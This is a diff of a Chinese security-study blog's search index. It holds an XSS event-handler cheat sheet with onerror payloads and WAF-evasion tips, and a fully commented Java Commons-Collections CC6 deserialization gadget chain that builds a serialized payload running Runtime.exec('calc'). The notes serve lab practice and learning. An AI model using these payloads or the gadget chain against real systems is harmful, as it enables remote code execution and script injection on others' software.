+<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
+<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
+]]></content>
       <categories>
         <category>技术</category>
         <category>基础漏洞</category>
-        <category>SQLi</category>
+        <category>XSS</category>
       </categories>
-      <tags>
-        <tag>sql靶场</tag>
-      </tags>
   </entry>
   <entry>
     <title>Oracle sql</title>
@@ -1096,77 +1810,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XSS 高频事件</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
-<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
-</blockquote>
-<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
-<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
-<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
-<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
-<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
-<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
-<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
-</ul>
-<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
-<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
-<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
-<li><code>onkeydown</code>：按下按键瞬间触发</li>
-<li><code>onkeyup</code>：松开按键触发</li>
-<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
-</ul>
-<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
-<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
-</blockquote>
-<ul>
-<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
-<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
-</ul>
-<blockquote>
-<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
-</blockquote>
-<ul>
-<li><code>onpageshow</code>：页面展示时触发（body）</li>
-</ul>
-<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
-<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
-<li><code>onselect</code>：选中输入框里面文字时触发</li>
-<li><code>oncopy</code>：复制内容触发</li>
-<li><code>oncut</code>：剪切内容触发</li>
-<li><code>onpaste</code>：粘贴内容触发</li>
-</ul>
-<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
-<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
-<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
-</ul>
-<hr>
-<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
-<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
-<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
-</ol>
-<blockquote>
-<p>举 onerror 例子：</p>
-<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
-<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
-</blockquote>
-<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
-<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
-<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
-<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
-<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
-</ol>
-<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
-<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>XSS</category>
-      </categories>
-  </entry>
-  <entry>
     <title>XSS深化总结</title>
     <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%E6%B7%B1%E5%8C%96%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1268,6 +1911,18 @@
         <category>技术</category>
         <category>基础漏洞</category>
         <category>XSS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CC6超详细版</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/CC6%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/</url>
+    <content><![CDATA[<span id="more"></span>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// import导入，以及具体干什么的  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="comment">//Transformer CC库顶层接口，只有一个方法transform(object input),输入对象、返回处理后的对象，所有变换类都实现它  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;  </span><br><span class="line"><span class="comment">//包括三个包，  </span></span><br><span class="line"><span class="comment">// ChainedTransformer:链式Transformer,依次执行数组里每一个Transformer,上一个返回值传给下一个，CC链调用核心  </span></span><br><span class="line"><span class="comment">// ConstantTransformer:不管输入是什么，永远返回你构造时传入的固定对象  </span></span><br><span class="line"><span class="comment">// InvokerTransformer:反射调用器！接收（方法名，参数类型数组，参数值数组），内部用反射执行方法，命令执行核心  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="comment">// 包装Map和Key，它的toString()方法会调用map.get(key),CC6关键跳板  </span></span><br><span class="line"><span class="comment">// map.get(key):  </span></span><br><span class="line"><span class="comment">// 普通HashMap的get(key):  </span></span><br><span class="line"><span class="comment">// 作用:根据key去集合里查询对应的value  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="comment">/* LazyMap里的get(key)经过重写:  </span></span><br><span class="line"><span class="comment">  LazyMap.get(key):  1、判断底层Map有没有这个key  </span></span><br><span class="line"><span class="comment">  2、key不存在，调用绑定的Tanrsformer.transform(key)  </span></span><br><span class="line"><span class="comment">  3、把transform返回的值存入map  </span></span><br><span class="line"><span class="comment">  所以这里并不是为了拿值，是为了触发ChainedTransformer,跑整条反射命令执行链  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="comment">// 入口类，重写了readobject();反序列化的时候会执行this.val.toString()  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//序列化工具：  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="comment">// 从字节数组读数据  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="comment">// 把序列化的二进制数据写到内存字节数组，不用落地成文件  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="comment">// 序列化对象，输出二进制  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="comment">// 反序列化，readobject()是触发反序列化漏洞的函数  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="comment">//java反射Field,用来修改私有成员变量val。BadAttributeValueExpException的val是private，不能直接赋值  </span></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="comment">//原生HashMap，被LazyMap包装的底层map  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6study</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//==============================================================================  </span></span><br><span class="line">        <span class="comment">// 第二块：构造反射执行链（Transformer数组）  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//构成反射执行链（Transformer数组）  </span></span><br><span class="line">        <span class="type">Transformer</span>[] <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="comment">//1. ConstantTransformer，无论传进来什么，固定返回Runtime.class  </span></span><br><span class="line">                <span class="comment">//目标：拿到Runtime这个Class对象，为后面getMethod做准备  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">                <span class="comment">//2. InvokerTransformer反射调用Runtime.class.getMethod(&quot;getRuntime&quot;)  </span></span><br><span class="line">                <span class="comment">//方法名：getMethod，参数类型：String.class,Class[].class,参数：&quot;getRuntime&quot;,空参数数组  </span></span><br><span class="line">                <span class="comment">//执行完得到：Method getRuntime() 对象（静态方法）  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">                <span class="comment">// 3. 调用method.invoke(null)  </span></span><br><span class="line">                <span class="comment">// invoke第一个参数是实例,静态方法填null  </span></span><br><span class="line">                <span class="comment">// 执行完得到：Runtime,getRuntime() 拿到Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">                <span class="comment">// 4.调用runtime.exec(&quot;calc&quot;),弹出计算器  </span></span><br><span class="line">  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        <span class="comment">// 这一整条数组，交给 ChainedTransformer 串行跑。  </span></span><br><span class="line">        <span class="comment">// 输入 → ConstantTransformer → Invoker1 → Invoker2 → Invoker3 → 命令执行。  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//=====================================================================================  </span></span><br><span class="line">        <span class="comment">// 第三块 ：LzayMap+TideMapEntry跳板构造  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);  </span><br><span class="line">        <span class="comment">// LazyMap.decorate(原始Map,绑定的Transformer)，chainedTransformer传给LazyMap当factory  </span></span><br><span class="line">        <span class="comment">// 规则：  </span></span><br><span class="line">        <span class="comment">// 当key不存在时：  </span></span><br><span class="line">        <span class="comment">// 1、调用chainedTransformer.transform(key),跑完整条变换流水线  </span></span><br><span class="line">        <span class="comment">// 2、把transform执行之后得到的结果放进innerMap  </span></span><br><span class="line">        <span class="comment">// 3、返回这个执行后的结果  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;testkey&quot;</span>);  </span><br><span class="line">        <span class="comment">/*  </span></span><br><span class="line"><span class="comment">        TideMapEntry源码关键重写了toSting()：  </span></span><br><span class="line"><span class="comment">         public String toString()</span></span><br><span class="line"><span class="comment">         &#123;</span></span><br><span class="line"><span class="comment">                return this.map.get(this.key).toString();</span></span><br><span class="line"><span class="comment">         &#125;         </span></span><br><span class="line"><span class="comment">         只要调用entry.toString()-&gt;自动执行lazyMap.get(&quot;testkey&quot;)</span></span><br><span class="line"><span class="comment">         -&gt;触发transform  </span></span><br><span class="line"><span class="comment">         这是二层跳板。  </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//=====================================================================================</span></span><br><span class="line">        <span class="comment">// 第四块：入口类 BadAttributeValueExpException + 反射改 val</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="comment">// 先new一个对象，构造参数只是初始化val为字符串&quot;aaa&quot;，后面我们要覆盖掉val  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        <span class="comment">// val是BadAttributeValueExpException的私有成员变量  </span></span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="comment">// setAccessible(true):关闭检查权限，暴力读写private字段  </span></span><br><span class="line">        valField.set(bad,entry);  </span><br><span class="line">        <span class="comment">// valField.set(bad,entry):把bad.val从原来的字符串，替换成我们造好的TiedMapEntry对象！  </span></span><br><span class="line">        <span class="comment">// 即：现在 bad.val = TideMapEntry(lazyMap,&quot;testkey&quot;)  </span></span><br><span class="line">        <span class="comment">/* BadAttributeValueExpExcrption.readObject()大致原生逻辑：  </span></span><br><span class="line"><span class="comment">          peivate void readObject(ObjecrInputStream ois) throws IOException,          </span></span><br><span class="line"><span class="comment">          ClassNotFoundException &#123;              </span></span><br><span class="line"><span class="comment">          ois.defaultReadObject();              </span></span><br><span class="line"><span class="comment">          val.toString(); ----反序列化的时候，自动执行val.toString(),整体启动开关  </span></span><br><span class="line"><span class="comment">          &#125;         </span></span><br><span class="line"><span class="comment">          */</span>  </span><br><span class="line">        <span class="comment">// ==============================================================    </span></span><br><span class="line">        <span class="comment">/*        整条链：  </span></span><br><span class="line"><span class="comment">         -&gt;ois.readObject()         </span></span><br><span class="line"><span class="comment">         -&gt;BadAttributeValueExpException.readObject()         </span></span><br><span class="line"><span class="comment">         -&gt;val.toString  这里的val被改成TideMapEntry  </span></span><br><span class="line"><span class="comment">         -&gt;TideMapEntry.toString()         </span></span><br><span class="line"><span class="comment">         -&gt;lazyMap。get(&quot;testkey&quot;)  </span></span><br><span class="line"><span class="comment">         -&gt;LazyMap里面没有testkey，执行chainedTransformer(key)  </span></span><br><span class="line"><span class="comment">         -&gt;链式Transformer依次执行：  </span></span><br><span class="line"><span class="comment">         （&quot;testkey&quot; →【Constant】→ Runtime.class →【getMethod】</span></span><br><span class="line"><span class="comment">         → getRuntime 方法  </span></span><br><span class="line"><span class="comment">         →【invoke】→ Runtime 实例 →【exec】→ Runtime.exec(&quot;calc&quot;)）  </span></span><br><span class="line"><span class="comment">         -&gt;返回进程  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">        <span class="comment">//------------------------------------------------------------------               </span></span><br><span class="line">        <span class="comment">// 第五块:序列化，生成payload  </span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="comment">// 前面有讲，把数据存在byte数组里面,这里就是bos，一个容器，里面封装了一个动态扩容的byte数组  </span></span><br><span class="line">        <span class="comment">// 值得注意的是bos只是容器，不能直接当字节数组读，所以有后面的byte[] payload = bos.toByteArray();  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);  </span><br><span class="line">        <span class="comment">// 用于把java对象序列化输出流,指定oos输出内容存入bos  </span></span><br><span class="line">  </span><br><span class="line">        oos.writeObject(bad);  </span><br><span class="line">        <span class="comment">//把我们构造好的BadAttributeValueExpException 对象（bad）序列化为二进制，然后存入bos里面  </span></span><br><span class="line">        oos.close();  </span><br><span class="line">        <span class="type">byte</span>[] <span class="variable">payload</span> <span class="operator">=</span> bos.toByteArray();  </span><br><span class="line">        <span class="comment">//把bos里的字节取出来，给payload这个标准字节数组，  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//输出payload,打印成十六进制格式  </span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="comment">// StringBuilder：可变字符串容器  </span></span><br><span class="line">        <span class="comment">// 普通字符串String不可变，每次都会新建字符串对象，因为这里payload实际是很长的，用String的话效率太低  </span></span><br><span class="line">        <span class="comment">// StringBuilder可以不断往后追加内容，不会反复新建对象  </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : payload) &#123;  </span><br><span class="line">            sd.append(String.format(<span class="string">&quot;%02x&quot;</span>,b));  </span><br><span class="line">            <span class="comment">// 02：不足两位的时候，前面补 0。比如字节 0x0a -&gt;输出 0a，而不是 a</span></span><br><span class="line">            <span class="comment">// Java 里byte 是有符号的负数，format 内部会自动处理，输出正确的两位hex。 </span></span><br><span class="line">            <span class="comment">// sd.append(...),把转好的两位十六进制字符，追加到 sd 里面,  </span></span><br><span class="line">            <span class="comment">// 坏了连这个都不知道，暴露java低陋的水平功底了  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.println(<span class="string">&quot;CC6 payload:\n&quot;</span> + sd);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//==========================================================  </span></span><br><span class="line">        <span class="comment">//本地验证  </span></span><br><span class="line">        <span class="comment">/*  </span></span><br><span class="line"><span class="comment">        ByteArrayInputStream bis = new ByteArrayInputStream(payload);</span></span><br><span class="line"><span class="comment">        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">        ois.readObject();        </span></span><br><span class="line"><span class="comment">        ois.close();        </span></span><br><span class="line"><span class="comment">         */</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>反序列化</category>
+        <category>CC链</category>
       </categories>
   </entry>
   <entry>
@@ -1456,18 +2111,6 @@
 <li>反序列化测试代码</li>
 </ol>
 ]]></content>
-      <categories>
-        <category>技术</category>
-        <category>JAVA安全</category>
-        <category>反序列化</category>
-        <category>CC链</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CC6超详细版</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/CC6%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/</url>
-    <content><![CDATA[<span id="more"></span>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// import导入，以及具体干什么的  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="comment">//Transformer CC库顶层接口，只有一个方法transform(object input),输入对象、返回处理后的对象，所有变换类都实现它  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;  </span><br><span class="line"><span class="comment">//包括三个包，  </span></span><br><span class="line"><span class="comment">// ChainedTransformer:链式Transformer,依次执行数组里每一个Transformer,上一个返回值传给下一个，CC链调用核心  </span></span><br><span class="line"><span class="comment">// ConstantTransformer:不管输入是什么，永远返回你构造时传入的固定对象  </span></span><br><span class="line"><span class="comment">// InvokerTransformer:反射调用器！接收（方法名，参数类型数组，参数值数组），内部用反射执行方法，命令执行核心  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="comment">// 包装Map和Key，它的toString()方法会调用map.get(key),CC6关键跳板  </span></span><br><span class="line"><span class="comment">// map.get(key):  </span></span><br><span class="line"><span class="comment">// 普通HashMap的get(key):  </span></span><br><span class="line"><span class="comment">// 作用:根据key去集合里查询对应的value  </span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="comment">/* LazyMap里的get(key)经过重写:  </span></span><br><span class="line"><span class="comment">  LazyMap.get(key):  1、判断底层Map有没有这个key  </span></span><br><span class="line"><span class="comment">  2、key不存在，调用绑定的Tanrsformer.transform(key)  </span></span><br><span class="line"><span class="comment">  3、把transform返回的值存入map  </span></span><br><span class="line"><span class="comment">  所以这里并不是为了拿值，是为了触发ChainedTransformer,跑整条反射命令执行链  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="comment">// 入口类，重写了readobject();反序列化的时候会执行this.val.toString()  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//序列化工具：  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="comment">// 从字节数组读数据  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="comment">// 把序列化的二进制数据写到内存字节数组，不用落地成文件  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="comment">// 序列化对象，输出二进制  </span></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="comment">// 反序列化，readobject()是触发反序列化漏洞的函数  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="comment">//java反射Field,用来修改私有成员变量val。BadAttributeValueExpException的val是private，不能直接赋值  </span></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="comment">//原生HashMap，被LazyMap包装的底层map  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6study</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//==============================================================================  </span></span><br><span class="line">        <span class="comment">// 第二块：构造反射执行链（Transformer数组）  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//构成反射执行链（Transformer数组）  </span></span><br><span class="line">        <span class="type">Transformer</span>[] <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="comment">//1. ConstantTransformer，无论传进来什么，固定返回Runtime.class  </span></span><br><span class="line">                <span class="comment">//目标：拿到Runtime这个Class对象，为后面getMethod做准备  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">                <span class="comment">//2. InvokerTransformer反射调用Runtime.class.getMethod(&quot;getRuntime&quot;)  </span></span><br><span class="line">                <span class="comment">//方法名：getMethod，参数类型：String.class,Class[].class,参数：&quot;getRuntime&quot;,空参数数组  </span></span><br><span class="line">                <span class="comment">//执行完得到：Method getRuntime() 对象（静态方法）  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">                <span class="comment">// 3. 调用method.invoke(null)  </span></span><br><span class="line">                <span class="comment">// invoke第一个参数是实例,静态方法填null  </span></span><br><span class="line">                <span class="comment">// 执行完得到：Runtime,getRuntime() 拿到Runtime实例  </span></span><br><span class="line">  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">                <span class="comment">// 4.调用runtime.exec(&quot;calc&quot;),弹出计算器  </span></span><br><span class="line">  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        <span class="comment">// 这一整条数组，交给 ChainedTransformer 串行跑。  </span></span><br><span class="line">        <span class="comment">// 输入 → ConstantTransformer → Invoker1 → Invoker2 → Invoker3 → 命令执行。  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//=====================================================================================  </span></span><br><span class="line">        <span class="comment">// 第三块 ：LzayMap+TideMapEntry跳板构造  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);  </span><br><span class="line">        <span class="comment">// LazyMap.decorate(原始Map,绑定的Transformer)，chainedTransformer传给LazyMap当factory  </span></span><br><span class="line">        <span class="comment">// 规则：  </span></span><br><span class="line">        <span class="comment">// 当key不存在时：  </span></span><br><span class="line">        <span class="comment">// 